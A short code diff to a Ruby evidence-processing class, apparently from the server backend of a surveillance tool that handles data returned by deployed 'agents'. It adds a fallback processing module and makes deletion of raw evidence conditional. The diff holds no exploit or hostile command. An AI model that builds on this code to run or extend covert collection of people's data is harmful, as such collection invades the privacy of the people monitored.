@@ -78,7 +78,7 @@ class InstanceProcessor
 =end
 
             # deserialize binary evidence and forward decoded
-            evidences = begin
+            evidences, action = begin
               RCS::Evidence.new(@key).deserialize(raw) do |data|
                 if forwarding?
                   path = "forwarded/#{evidence_id}.dec"
@@ -115,7 +115,12 @@ class InstanceProcessor
 
               # find correct processing module and extend evidence
               mod = "#{ev[:type].to_s.capitalize}Processing"
-              ev.extend eval(mod) if RCS.const_defined? mod.to_sym
+              if RCS.const_defined? mod.to_sym
+                ev.extend eval(mod)
+              else
+                ev.extend DefaultProcessing
+              end
+
               ev.process if ev.respond_to? :process
 
               # override original type
@@ -139,8 +144,10 @@ class InstanceProcessor
             processing_time = Time.now - start_time
             trace :info, "[#{evidence_id}] processed #{ev_type.upcase} for agent #{@agent['name']} in #{processing_time} sec"
 
-            RCS::DB::GridFS.delete(evidence_id, "evidence")
-            trace :debug, "[#{evidence_id}] deleted raw evidence"
+            if action == :delete_raw
+              RCS::DB::GridFS.delete(evidence_id, "evidence")
+              trace :debug, "[#{evidence_id}] deleted raw evidence"
+            end
 
           rescue Mongo::ConnectionFailure => e
             trace :error, "[#{evidence_id}] cannot connect to database, retrying in 5 seconds ..."
